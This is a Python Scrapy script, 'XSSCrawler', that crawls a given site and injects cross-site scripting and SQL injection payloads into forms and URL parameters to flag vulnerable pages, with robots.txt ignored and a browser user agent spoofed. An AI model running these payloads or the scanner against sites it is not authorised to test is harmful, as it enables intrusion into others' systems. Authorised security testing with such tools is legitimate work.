import argparse
import logging
import sys
import time
from urllib.parse import urlparse, urljoin
from scrapy.crawler import CrawlerProcess
from scrapy.spiders import Spider
from scrapy.http import FormRequest, Request
from lxml import html
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Default XSS Payloads
DEFAULT_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)"',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    'javascript:alert(1)',
    '<input autofocus onfocus=alert(1)>',
]

# Default SQL Injection Payloads
DEFAULT_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "';--",
    "' UNION SELECT 1,2,3--",
    "' OR SLEEP(5)--",
    "1' AND 1=1--",
]

class XSSCrawlerSpider(Spider):
    name = 'xsscrawler'
    custom_settings = {
        'CONCURRENT_REQUESTS': 10,
        'DOWNLOAD_DELAY': 0.5,
        'USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'ROBOTSTXT_OBEY': False,
        'LOG_LEVEL': 'INFO',
        'REQUEST_FINGERPRINTER_IMPLEMENTATION': '2.7',
        'HTTPERROR_ALLOWED_CODES': [403],
    }

    def __init__(self, start_url, output_file='vulnerabilities.txt', max_depth=5, cookie=None, xss_payloads=None, sqli_payloads=None, test_xss=True, test_sqli=True, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.start_urls = [start_url]
        self.allowed_domains = [urlparse(start_url).netloc]
        self.output_file = output_file
        self.max_depth = int(max_depth)
        self.cookie = cookie
        self.bloom = set()
        self.vulnerabilities = []
        self.xss_payloads = xss_payloads if xss_payloads else DEFAULT_XSS_PAYLOADS
        self.sqli_payloads = sqli_payloads if sqli_payloads else DEFAULT_SQLI_PAYLOADS
        self.test_xss = test_xss
        self.test_sqli = test_sqli
        logger.info(f"Starting crawl on {start_url} with max depth {max_depth}")

    def start_requests(self):
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': self.start_urls[0],
        }
        if self.cookie:
            headers['Cookie'] = self.cookie
        for url in self.start_urls:
            yield Request(url, headers=headers, callback=self.parse, meta={'depth': 0})

    def parse(self, response, depth=0):
        """Parse the response, extract links and forms, and test for vulnerabilities."""
        if depth > self.max_depth:
            return

        if response.url in self.bloom:
            return
        self.bloom.add(response.url)

        for href in response.css('a::attr(href)').getall():
            absolute_url = urljoin(response.url, href)
            if self._is_allowed_url(absolute_url):
                yield Request(absolute_url, callback=lambda r: self.parse(r, depth + 1))

        tree = html.fromstring(response.text)
        forms = tree.xpath('//form')
        for form in forms:
            yield from self._test_form(response, form)

        yield from self._test_url_params(response)

    def _is_allowed_url(self, url):
        parsed = urlparse(url)
        return parsed.netloc in self.allowed_domains

    def _test_form(self, response, form):
        action = form.get('action') or response.url
        method = form.get('method', 'get').lower()
        inputs = form.xpath('.//input | .//textarea | .//select')
        form_data = {}

        # Test XSS
        if self.test_xss:
            for input_elem in inputs:
                name = input_elem.get('name')
                if name:
                    form_data[name] = self.xss_payloads[0]

            if form_data:
                absolute_action = urljoin(response.url, action)
                if method == 'post':
                    yield FormRequest(
                        absolute_action,
                        method='POST',
                        formdata=form_data,
                        callback=self._check_response,
                        meta={'payload': self.xss_payloads[0], 'type': 'xss', 'url': response.url, 'start_time': time.time()}
                    )
                else:
                    yield FormRequest(
                        absolute_action,
                        method='GET',
                        formdata=form_data,
                        callback=self._check_response,
                        meta={'payload': self.xss_payloads[0], 'type': 'xss', 'url': response.url, 'start_time': time.time()}
                    )

        # Test SQLi
        if self.test_sqli:
            for input_elem in inputs:
                name = input_elem.get('name')
                if name:
                    form_data[name] = self.sqli_payloads[0]
                    yield from self._submit_form_with_payload(response, form, method, action, name, self.sqli_payloads[0])

    def _submit_form_with_payload(self, response, form, method, action, field_name, payload):
        form_data = {}
        inputs = form.xpath('.//input | .//textarea | .//select')
        for input_elem in inputs:
            name = input_elem.get('name')
            if name:
                if name == field_name:
                    form_data[name] = payload
                else:
                    form_data[name] = 'test'

        absolute_action = urljoin(response.url, action)
        if method == 'post':
            yield FormRequest(
                absolute_action,
                method='POST',
                formdata=form_data,
                callback=self._check_response,
                meta={'payload': payload, 'type': 'sqli', 'url': response.url, 'start_time': time.time()}
            )
        else:
            yield FormRequest(
                absolute_action,
                method='GET',
                formdata=form_data,
                callback=self._check_response,
                meta={'payload': payload, 'type': 'sqli', 'url': response.url, 'start_time': time.time()}
            )

    def _test_url_params(self, response):
        parsed_url = urlparse(response.url)
        if not parsed_url.query:
            return

        from urllib.parse import parse_qs, urlencode
        query_params = parse_qs(parsed_url.query)
        for param in query_params:
            if self.test_xss:
                for payload in self.xss_payloads:
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    new_query = urlencode(new_params, doseq=True)
                    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    yield Request(
                        new_url,
                        callback=self._check_response,
                        meta={'payload': payload, 'type': 'xss', 'url': response.url, 'start_time': time.time()}
                    )
            if self.test_sqli:
                for payload in self.sqli_payloads:
                    new_params = query_params.copy()
                    new_params[param] = [payload]
                    new_query = urlencode(new_params, doseq=True)
                    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    yield Request(
                        new_url,
                        callback=self._check_response,
                        meta={'payload': payload, 'type': 'sqli', 'url': response.url, 'start_time': time.time()}
                    )

    def _check_response(self, response):
        start_time = response.meta.get('start_time', time.time())
        payload = response.meta['payload']
        vuln_type = response.meta['type']
        original_url = response.meta['url']

        if vuln_type == 'xss':
            if payload in response.text:
                vuln = f"[XSS] Payload '{payload}' reflected in {response.url} (from {original_url})"
                logger.warning(vuln)
                self.vulnerabilities.append(vuln)
                # Check for stored XSS by revisiting the original page
                yield Request(
                    original_url,
                    callback=self._check_stored_xss,
                    meta={'payload': payload, 'original_url': original_url}
                )
        elif vuln_type == 'sqli':
            error_patterns = [
                r'mysql_fetch_array',
                r'You have an error in your SQL syntax',
                r'ORA-[0-9]+:',
            ]
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    vuln = f"[SQLi] Potential SQL injection in {response.url} with payload '{payload}' (from {original_url})"
                    logger.warning(vuln)
                    self.vulnerabilities.append(vuln)
                    break
            if time.time() - start_time > 4:
                vuln = f"[SQLi] Potential time-based SQL injection in {response.url} with payload '{payload}' (from {original_url})"
                logger.warning(vuln)
                self.vulnerabilities.append(vuln)

    def _check_stored_xss(self, response):
        payload = response.meta['payload']
        original_url = response.meta['original_url']
        if payload in response.text:
            vuln = f"[Stored XSS] Payload '{payload}' found in {response.url} (from {original_url})"
            logger.warning(vuln)
            self.vulnerabilities.append(vuln)

    def closed(self, reason):
        """Save vulnerabilities to file when spider closes."""
        with open(self.output_file, 'w') as f:
            for vuln in self.vulnerabilities:
                f.write(vuln + '\n')
        logger.info(f"Saved {len(self.vulnerabilities)} vulnerabilities to {self.output_file}")

def main():
    parser = argparse.ArgumentParser(description='XSSCrawler: A web crawler for detecting XSS and SQLi vulnerabilities.')
    parser.add_argument('-u', '--url', required=True, help='Target URL to start crawling')
    parser.add_argument('-o', '--output', default='vulnerabilities.txt', help='Output file for vulnerabilities')
    parser.add_argument('-d', '--depth', default=5, type=int, help='Maximum crawl depth')
    parser.add_argument('-c', '--concurrency', default=10, type=int, help='Number of concurrent requests')
    parser.add_argument('--cookie', help='Optional cookie for authenticated requests')
    parser.add_argument('--xss-payloads', nargs='+', help='Custom XSS payloads (space-separated)')
    parser.add_argument('--sqli-payloads', nargs='+', help='Custom SQLi payloads (space-separated)')
    parser.add_argument('--no-xss', action='store_false', dest='test_xss', help='Disable XSS testing')
    parser.add_argument('--no-sqli', action='store_false', dest='test_sqli', help='Disable SQLi testing')
    args = parser.parse_args()

    process = CrawlerProcess({
        'CONCURRENT_REQUESTS': args.concurrency,
        'REQUEST_FINGERPRINTER_IMPLEMENTATION': '2.7',
    })
    process.crawl(XSSCrawlerSpider, start_url=args.url, output_file=args.output, max_depth=args.depth, cookie=args.cookie,
                  xss_payloads=args.xss_payloads, sqli_payloads=args.sqli_payloads, test_xss=args.test_xss, test_sqli=args.test_sqli)
    process.start()

if __name__ == '__main__':
    main()
